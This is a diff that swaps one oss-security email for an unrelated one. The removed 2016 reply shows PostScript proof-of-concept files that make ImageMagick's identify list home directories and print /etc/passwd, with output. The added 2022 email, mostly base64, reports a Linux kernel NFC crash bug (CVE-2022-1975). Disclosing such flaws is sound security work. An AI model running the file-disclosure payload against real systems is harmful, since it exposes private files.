@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2963" "Wednesday" "28" "September" "2016" "13:52:36" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>" "101" "Re: [oss-security] ImageMagick identify \"d:\" hangs" "^Date:" nil nil "9" "2016092820:52:36" "[oss-security] ImageMagick identify \"d:\" hangs" (number mark "        taviso@googl Sep 28  101/2963  " thread-indent "\"Re: [oss-security] ImageMagick identify \"d:\" hangs\"\n") "<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>" ("<alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>" "<20160927142500.3x26pcrhw5x4nt6s@jwilk.net>" "<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>" "<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 14333 invoked by uid 550); 28 Sep 2016 20:56:51 -0000
+Received: (qmail 21715 invoked by uid 550); 5 Jun 2022 11:45:54 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,142 +6,134 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 11928 invoked from network); 28 Sep 2016 20:53:10 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=google.com; s=20120113;
-        h=mime-version:in-reply-to:references:from:date:message-id:subject:to;
-        bh=S5XocsZs+XzT5FKmBie0Si0QegDdU3UweWeojvttdrY=;
-        b=AnzJqvUC8XjfHfin/tzr5z7KFtr9U0fk6O7HpklwOP2WUd0gLGozw69Lcu2SnOQ5zF
-         WuIUYHiK+1Q0J0hBT7yaE6ihuXy6wGEacVT9byXcG2FSUDKniUbrkwYsmHrI4/dE+hlp
-         8BN0/k1KiUGELHJkEjOlYVxdzVJEVQLOHjP2wIaIcVoALiGzeWuj66rUt48uH/3CWzlm
-         Iwmu5bRhkdXf3Toyz1whDm6pwDxI98kQoKJbrOuTaPAqqN5XMR9vQHAKzMWWr5scbT4U
-         qzbFhfz7TpkE6QcWwM/EYHw6Iyxd/GB1+3sH+JbHlt6yhPujceln9tLep9SSTmyiDugr
-         ZU2w==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
-         :message-id:subject:to;
-        bh=S5XocsZs+XzT5FKmBie0Si0QegDdU3UweWeojvttdrY=;
-        b=PKHk6d1xazAgWM2TvrQtLIOdR//ozgxAyaKtC6i7oNWFROxX+RST+cRaDTq61aZ3/O
-         aRyA2SR1d4LkMoRblKmK9hFMcstXLL+u3u6/ZVd9B8yFrzRoxdt8SynzHt9Fh23OsOc2
-         J3aseQAgTEPR/VTZh57wZSCnq3ZWCSH1ePPJ3YLI6/7W3qF0Pkcj9xp60AL+n2PEWDek
-         NEHW0/I3Y5a9Zo26aV81vsyJ4zwbFsbMHP1MmgEWOrd1dLfJJFcVOq0o7OqO4265lgXB
-         17xG//IF1Avup3hDkIHI4e/V0vbRC0bZL60uLomn+rMFpPyli9nHQbjnwf3j1nSrm+2Y
-         2ERg==
-X-Gm-Message-State: AA6/9RkBNorpYsdT+QzjE8tadcIJlRu28QdL0gAewGWlvNS6mksYN9KHGIHromVqw5db4/bv1TX8KNbbIayYIeO2
-X-Received: by 10.31.216.5 with SMTP id p5mr15882576vkg.159.1475095977359;
- Wed, 28 Sep 2016 13:52:57 -0700 (PDT)
-MIME-Version: 1.0
-In-Reply-To: <CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>
-References: <alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>
- <20160927142500.3x26pcrhw5x4nt6s@jwilk.net> <alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>
- <CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>
-Message-ID: <CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
-Content-Type: text/plain; charset=UTF-8
-Date: Wed, 28 Sep 2016 13:52:36 -0700
-From: Tavis Ormandy <taviso@google.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] ImageMagick identify "d:" hangs
+Received: (qmail 1427 invoked from network); 5 Jun 2022 02:52:10 -0000
+X-Originating-IP: [106.117.78.144]
+Date: Sun, 5 Jun 2022 10:51:54 +0800 (GMT+08:00)
+X-CM-HeaderCharset: UTF-8
+From: duoming@zju.edu.cn
 To: oss-security@lists.openwall.com
+X-Priority: 3
+X-Mailer: Coremail Webmail Server Version XT5.0.13 build 20210104(ab8c30b6)
+ Copyright (c) 2002-2022 www.mailtech.cn zju.edu.cn
+Content-Transfer-Encoding: base64
+Content-Type: text/plain; charset=UTF-8
+MIME-Version: 1.0
+Message-ID: <62cf5ab.4d34d.18131c6b47b.Coremail.duoming@zju.edu.cn>
+X-Coremail-Locale: zh_CN
+X-CM-TRANSID: cC_KCgDni7hLGpxi_MKDAQ--.35132W
+X-CM-SenderInfo: qssqjiasttq6lmxovvfxof0/1tbiAgAMAVZdtaCl2wABsu
+X-Coremail-Antispam: 1Ur529EdanIXcx71UUUUU7IcSsGvfJ3iIAIbVAYjsxI4VW3Jw
+	CS07vEb4IE77IF4wCS07vE1I0E4x80FVAKz4kxMIAIbVAFxVCaYxvI4VCIwcAKzIAtYxBI
+	daVFxhVjvjDU=
+Subject: [oss-security] CVE-2022-1975: Linux kernel: sleep in atomic context bug when nfc firmware
+ download timeout
 
-On Wed, Sep 28, 2016 at 11:16 AM, Tavis Ormandy <taviso@google.com> wrote:
-> On Tue, Sep 27, 2016 at 7:56 AM, Bob Friesenhahn
-> <bfriesen@simple.dallas.tx.us> wrote:
->>
->> On Tue, 27 Sep 2016, Jakub Wilk wrote:
->>
->>> * Bob Friesenhahn <bfriesen@simple.dallas.tx.us>, 2016-09-27, 08:48:
->>>>
->>>> From my own investigations, I used
->>>>
->>>>  identify -debug all "d:"
->>>>
->>>> and see that a temporary file is reported to be created and then the program hangs which no apparent CPU usage.
->>>
->>>
->>> strace tells me that it waits for input on stdin.
->>> This is a simpler way to make it "hang":
->>>
->>>  identify -
->>
->>
->> This is what I expected was happening.  The main thing to investigate is if the "ImageTragick" patches distributions are using do protect against this possible issue as well.
->>
->
-> You know, you reminded me that the pdf and/or the ps delegate probably
-> allows filesystem enumeration via filenameforall, as far as I know
-> that's permitted with -dSAFER. I think that's probably unexpected.
->
-> For example, if you try to identify a file like this, it will list
-> local usernames on stdout, I guess a real attack would have to encode
-> that in the output somehow, but I only know enough postscript to know
-> i'd rather write bf. Might be a fun exercise for masochistic hackers
-> though.
->
-> $ cat whatever.jpeg
-> %PDF-1.0
-> (/home/*) {==} 256 string filenameforall
-> $ identify whatever.jpeg
-> (/home/taviso)
-> identify.im6: Postscript delegate failed `whatever.jpeg': No such file
-> or directory @ error/pdf.c/ReadPDFImage/677.
->
-> Tavis.
-
-Maybe I'm missing something, because .libfile also works, this seems
-like free arbitrary file disclosure?
-
-Here is the code I'm testing with (Note: I really don't know much
-postscript - and I hate it).
-
-$ cat test.ps
-/dumpname {
-    dup             % copy filename
-    dup             % copy filename
-    print           % print filename
-    (\n) print      % print newline
-    status          % stat filename
-    {
-        (stat succeeded\n) print
-        ( ctime:) print
-        64 string cvs print
-        ( atime:) print
-        64 string cvs print
-        ( size:) print
-        64 string cvs print
-        ( blocks:) print
-        64 string cvs print
-        (\n) print
-        (\n) print
-    }{
-        (unable to stat\n\n) print
-    } ifelse
-    .libfile        % open as library
-    {
-        (.libfile returned file\n\n) print
-        64 string readstring
-        pop         % discard result (should proably test)
-        print
-        (\n) print
-    }{
-        (.libfile returned string\n) print
-        print
-        (\n) print
-    } ifelse
-} def
-
-(/etc/pass*) /dumpname load 256 string filenameforall
-
-$ identify test.ps
-/etc/passwd
-stat succeeded
- ctime:1474998792 atime:1474998792 size:2662 blocks:8
-
-.libfile returned file
-
-root:x:0:0:root:/root:/bin/bash
-
-It seems obvious you can manipulate the output based on this. I'd be
-interested to hear why I'm wrong about this.
-
-Tavis.
+SGVsbG8gdGhlcmUsCgpUaGVyZSBhcmUgc2xlZXAgaW4gYXRvbWljIGNvbnRl
+eHQgYnVncyB0aGF0IGNvdWxkIGNhdXNlIGtlcm5lbCBwYW5pYyBkdXJpbmcK
+bmZjIGZpcm13YXJlIGRvd25sb2FkIHByb2Nlc3MuCgo9Kj0qPSo9Kj0qPSo9
+Kj0qPSAgQnVnIERldGFpbHMgID0qPSo9Kj0qPSo9Kj0qPSo9CgpUaGUgcm9v
+dCBjYXVzZSBvZiB0aGlzIGJ1ZyBpcyB0aGF0IG5sbXNnX25ldyB3aXRoIEdG
+UF9LRVJORUwgcGFyYW1ldGVyIGlzIGNhbGxlZAppbiBmd19kbmxkX3RpbWVv
+dXQgd2hpY2ggaXMgYSB0aW1lciBoYW5kbGVyLiAKClRoZSBubG1zZ19uZXcg
+d2l0aCBHRlBfS0VSTkVMIHBhcmFtZXRlciBtYXkgc2xlZXAgZHVyaW5nIG1l
+bW9yeSBhbGxvY2F0aW9uIHByb2Nlc3MsCmFuZCB0aGUgdGltZXIgaGFuZGxl
+ciBpcyBydW4gYXMgdGhlIHJlc3VsdCBvZiBhICJzb2Z0d2FyZSBpbnRlcnJ1
+cHQiIHRoYXQgc2hvdWxkIG5vdApjYWxsIGFueSBvdGhlciBmdW5jdGlvbnMg
+dGhhdCBjb3VsZCBzbGVlcC4KCj0qPSo9Kj0qPSo9Kj0qPSo9ICBCdWcgRWZm
+ZWN0cyAgPSo9Kj0qPSo9Kj0qPSo9Kj0KCldlIGNhbiBzdWNjZXNzZnVsbHkg
+dHJpZ2dlciB0aGUgdnVsbmVyYWJpbGl0aWVzIHRvIGNyYXNoIHRoZSBsaW51
+eCBrZXJuZWwuCgpbICAgNDEuODUyMDE5XSBnZW5lcmFsIHByb3RlY3Rpb24g
+ZmF1bHQsIHByb2JhYmx5IGZvciBub24tY2Fub25pY2FsIGFkZHJlc3MgMHhk
+ZWFkMDAwMDAwMDAwMTJhOiAwMDAwIFsjMV0gUFJFRU1QVCBTTVAgTk9QVEkK
+WyAgIDQxLjg3MTI2Ml0gKE5VTEwgZGV2aWNlICopOiBORkM6IEZXIGxvYWRp
+bmcgdGltZW91dApbICAgNDEuODUyMDE5XSBSSVA6IDAwMTA6X19ydW5fdGlt
+ZXJzLnBhcnQuMCsweDM5MS8weDUwMApbICAgNDEuODUyMDE5XSBDb2RlOiAw
+MCA0OCA4YiA0NSAwOCA0OCA4OSBjNyA0OCA4OSAwNCAyNCBlOCBmOCA1NCAw
+ZSAwMCA0OCA4YiAwNCAyNCA0YyA4OSAzMCA0ZCA4NSBmNiA3NCAxMSA0OSA4
+ZCA3ZSAwOCBlOCA5ClsgICA0MS44NTIwMTldIFJTUDogMDAxODpmZmZmYzkw
+MDAwMGM4ZWMwIEVGTEFHUzogMDAwMDAwNDYKWyAgIDQxLjg1MjAxOV0gUkFY
+OiBmZmZmYzkwMDAwMGM4ZWYwIFJCWDogZmZmZmM5MDAwMDBjOGVmMCBSQ1g6
+IGZmZmZmZmZmODExNjkyN2QKWyAgIDQxLjg1MjAxOV0gUkRYOiAwMDAwMDAw
+MDAwMDAwMzhiIFJTSTogMDAwMWZmZmZmZmZmZmZmZiBSREk6IGRlYWQwMDAw
+MDAwMDAxMmEKWyAgIDQxLjg1MjAxOV0gUkJQOiBmZmZmODg4MDA0NmNiZDIw
+IFIwODogZmZmZmZmZmY4NDE3YWI3OCBSMDk6IDAwMDAwMDAwMDAwMDAwMDAK
+WyAgIDQxLjg1MjAxOV0gUjEwOiAwMDAwMDAwMDAwMDAwMDAxIFIxMTogMDAw
+MDAwMDAwMDAwMDAwMiBSMTI6IGZmZmY4ODgwN2RjOWJmMDAKWyAgIDQxLjg1
+MjAxOV0gUjEzOiBmZmZmODg4MDdkYzliZjQwIFIxNDogZGVhZDAwMDAwMDAw
+MDEyMiBSMTU6IGZmZmY4ODgwMDQ2Y2JkMjgKWyAgIDQxLjg1MjAxOV0gRlM6
+ICAwMDAwMDAwMDAwMDAwMDAwKDAwMDApIEdTOmZmZmY4ODgwN2RjODAwMDAo
+MDAwMCkga25sR1M6MDAwMDAwMDAwMDAwMDAwMApbICAgNDEuODUyMDE5XSBD
+UzogIDAwMTAgRFM6IDAwMDAgRVM6IDAwMDAgQ1IwOiAwMDAwMDAwMDgwMDUw
+MDMzClsgICA0MS44NTIwMTldIENSMjogMDAwMDdmYTdmMDIyOTE4MCBDUjM6
+IDAwMDAwMDAwMDMyMjIwMDAgQ1I0OiAwMDAwMDAwMDAwMDAwNmUwClsgICA0
+MS44NTIwMTldIENhbGwgVHJhY2U6ClsgICA0MS44NTIwMTldICA8SVJRPgpb
+ICAgNDEuODUyMDE5XSAgPyBjbG9ja2V2ZW50c19wcm9ncmFtX2V2ZW50KzB4
+ZDkvMHgxNTAKWyAgIDQxLjg1MjAxOV0gID8gdGlja19wcm9ncmFtX2V2ZW50
+KzB4NTAvMHg5MApbICAgNDEuODUyMDE5XSAgcnVuX3RpbWVyX3NvZnRpcnEr
+MHg0Zi8weGEwClsgICA0MS44NTIwMTldICBfX2RvX3NvZnRpcnErMHgxMWQv
+MHgzNjMKWyAgIDQxLjg1MjAxOV0gIGlycV9leGl0X3JjdSsweGIwLzB4MTAw
+ClsgICA0MS44NTIwMTldICBzeXN2ZWNfYXBpY190aW1lcl9pbnRlcnJ1cHQr
+MHg4Zi8weGMwClsgICA0MS44NTIwMTldICA8L0lSUT4KWyAgIDQxLjg1MjAx
+OV0gIDxUQVNLPgpbICAgNDEuODUyMDE5XSAgYXNtX3N5c3ZlY19hcGljX3Rp
+bWVyX2ludGVycnVwdCsweDEyLzB4MjAKWyAgIDQxLjg1MjAxOV0gUklQOiAw
+MDEwOnJlc2N1ZXJfdGhyZWFkKzB4NWE1LzB4NmQwClsgICA0MS44NTIwMTld
+IENvZGU6IDAwIDQ4IDhiIDAzIDQ4IDM5IGMzIDBmIDg0IGNmIDAwIDAwIDAw
+IDQ4IGM3IGM3IDYwIGQzIDI2IDgzIGU4IDdjIDYxIDU4IDAxIGU5IGNkIGZl
+IGZmIGZmIDQ4IGM3IGM3IDYwIDcKWyAgIDQxLjg1MjAxOV0gUlNQOiAwMDE4
+OmZmZmZjOTAwMDBlMDNlNzAgRUZMQUdTOiAwMDAwMDI4NgpbICAgNDEuODUy
+MDE5XSBSQVg6IDAwMDAwMDAwODAwMDAwMDAgUkJYOiBmZmZmODg4MDA3Mjlj
+MGU4IFJDWDogMDAwMDAwMDAwMDAwMDAwMApbICAgNDEuODUyMDE5XSBSRFg6
+IDAwMDAwMDAwMDAwMDAwMDEgUlNJOiAwMDAxZmZmZjgzMjZkMzYwIFJESTog
+MDAwMDAwMDBmZmZmZmZmZgpbICAgNDEuODUyMDE5XSBSQlA6IGZmZmY4ODgw
+MDczZTgwMmMgUjA4OiBmZmZmZmZmZjg0MTdhY2UwIFIwOTogMDAwMDAwMDAw
+MDAwMDAwMApbICAgNDEuODUyMDE5XSBSMTA6IDAwMDFmZmZmZmZmZmZmZmYg
+UjExOiBmZmZmZmZmZjgxMTEyNWE3IFIxMjogZmZmZjg4ODAwNzNhZjcwMApb
+ICAgNDEuODUyMDE5XSBSMTM6IGZmZmZjOTAwMDAyN2ZiNjggUjE0OiBmZmZm
+ODg4MDA3MjljMDAwIFIxNTogZmZmZjg4ODAwNzNlODAwMApbICAgNDEuODUy
+MDE5XSAgPyBkb19yYXdfc3Bpbl91bmxvY2srMHg5Ny8weGYwClsgICA0MS44
+NTIwMTldICA/IF9fdGhpc19jcHVfcHJlZW1wdF9jaGVjaysweGYvMHgxMApb
+ICAgNDEuODUyMDE5XSAgPyBsb2NrX3JlbGVhc2UrMHgxM2MvMHgyYzAKWyAg
+IDQxLjg1MjAxOV0gID8gZG9fcmF3X3NwaW5fdW5sb2NrKzB4OTcvMHhmMApb
+ICAgNDEuODUyMDE5XSAgPyBwcm9jZXNzX29uZV93b3JrKzB4YTgwLzB4YTgw
+ClsgICA0MS44NTIwMTldICBrdGhyZWFkKzB4MTdlLzB4MWIwClsgICA0MS44
+NTIwMTldICA/IGt0aHJlYWRfY29tcGxldGVfYW5kX2V4aXQrMHgyMC8weDIw
+ClsgICA0MS44NTIwMTldICByZXRfZnJvbV9mb3JrKzB4MjIvMHgzMApbICAg
+NDEuODUyMDE5XSAgPC9UQVNLPgpbICAgNDEuODUyMDE5XSBNb2R1bGVzIGxp
+bmtlZCBpbjoKWyAgIDQxLjg1MjAxOV0gLS0tWyBlbmQgdHJhY2UgMDAwMDAw
+MDAwMDAwMDAwMCBdLS0tClsgICA0MS44NTIwMTldIFJJUDogMDAxMDpfX3J1
+bl90aW1lcnMucGFydC4wKzB4MzkxLzB4NTAwClsgICA0MS44NTIwMTldIENv
+ZGU6IDAwIDQ4IDhiIDQ1IDA4IDQ4IDg5IGM3IDQ4IDg5IDA0IDI0IGU4IGY4
+IDU0IDBlIDAwIDQ4IDhiIDA0IDI0IDRjIDg5IDMwIDRkIDg1IGY2IDc0IDEx
+IDQ5IDhkIDdlIDA4IGU4IDkKWyAgIDQxLjg1MjAxOV0gUlNQOiAwMDE4OmZm
+ZmZjOTAwMDAwYzhlYzAgRUZMQUdTOiAwMDAwMDA0NgpbICAgNDEuODUyMDE5
+XSBSQVg6IGZmZmZjOTAwMDAwYzhlZjAgUkJYOiBmZmZmYzkwMDAwMGM4ZWYw
+IFJDWDogZmZmZmZmZmY4MTE2OTI3ZApbICAgNDEuODUyMDE5XSBSRFg6IDAw
+MDAwMDAwMDAwMDAzOGIgUlNJOiAwMDAxZmZmZmZmZmZmZmZmIFJESTogZGVh
+ZDAwMDAwMDAwMDEyYQpbICAgNDEuODUyMDE5XSBSQlA6IGZmZmY4ODgwMDQ2
+Y2JkMjAgUjA4OiBmZmZmZmZmZjg0MTdhYjc4IFIwOTogMDAwMDAwMDAwMDAw
+MDAwMApbICAgNDEuODUyMDE5XSBSMTA6IDAwMDAwMDAwMDAwMDAwMDEgUjEx
+OiAwMDAwMDAwMDAwMDAwMDAyIFIxMjogZmZmZjg4ODA3ZGM5YmYwMApbICAg
+NDEuODUyMDE5XSBSMTM6IGZmZmY4ODgwN2RjOWJmNDAgUjE0OiBkZWFkMDAw
+MDAwMDAwMTIyIFIxNTogZmZmZjg4ODAwNDZjYmQyOApbICAgNDEuODUyMDE5
+XSBGUzogIDAwMDAwMDAwMDAwMDAwMDAoMDAwMCkgR1M6ZmZmZjg4ODA3ZGM4
+MDAwMCgwMDAwKSBrbmxHUzowMDAwMDAwMDAwMDAwMDAwClsgICA0MS44NTIw
+MTldIENTOiAgMDAxMCBEUzogMDAwMCBFUzogMDAwMCBDUjA6IDAwMDAwMDAw
+ODAwNTAwMzMKWyAgIDQxLjg1MjAxOV0gQ1IyOiAwMDAwN2ZhN2YwMjI5MTgw
+IENSMzogMDAwMDAwMDAwMzIyMjAwMCBDUjQ6IDAwMDAwMDAwMDAwMDA2ZTAK
+WyAgIDQxLjg1MjAxOV0gS2VybmVsIHBhbmljIC0gbm90IHN5bmNpbmc6IEZh
+dGFsIGV4Y2VwdGlvbiBpbiBpbnRlcnJ1cHQKWyAgIDQxLjg1MjAxOV0gU2h1
+dHRpbmcgZG93biBjcHVzIHdpdGggTk1JClsgICA0MS44NTIwMTldIEtlcm5l
+bCBPZmZzZXQ6IGRpc2FibGVkClsgICA0MS44NTIwMTldIC0tLVsgZW5kIEtl
+cm5lbCBwYW5pYyAtIG5vdCBzeW5jaW5nOiBGYXRhbCBleGNlcHRpb24gaW4g
+aW50ZXJydXB0IF0tLS0KCj0qPSo9Kj0qPSo9Kj0qPSo9ICBCdWcgRml4ICA9
+Kj0qPSo9Kj0qPSo9Kj0qPQoKVGhlIHBhdGNoIHRoYXQgaGF2ZSBiZWVuIGFw
+cGxpZWQgdG8gbWFpbmxpbmUgTGludXgga2VybmVsIGlzIHNob3duIGJlbG93
+LgpodHRwczovL2dpdGh1Yi5jb20vdG9ydmFsZHMvbGludXgvY29tbWl0LzQw
+NzFiZjEyMWQ1OTk0NGQ1Y2QyMjM4ZGUwNjQyZjNkNzk5NWE5OTcKCj0qPSo9
+Kj0qPSo9Kj0qPSo9ICBUaW1lbGluZSAgPSo9Kj0qPSo9Kj0qPSo9Kj0KCjIw
+MjItMDUtMDU6IGNvbW1pdCA0MDcxYmYxMjFkNTkgYWNjZXB0ZWQgdG8gbWFp
+bmxpbmUga2VybmVsCjIwMjItMDYtMDM6IENWRS0yMDIyLTE5NzUgaXMgYXNz
+aWduZWQKCj0qPSo9Kj0qPSo9Kj0qPSo9ICBDcmVkaXQgID0qPSo9Kj0qPSo9
+Kj0qPSo9CgpEdW9taW5nIFpob3UgPGR1b21pbmdAemp1LmVkdS5jbj4KCkJl
+c3QgUmVnYXJkcywKRHVvbWluZyBaaG91
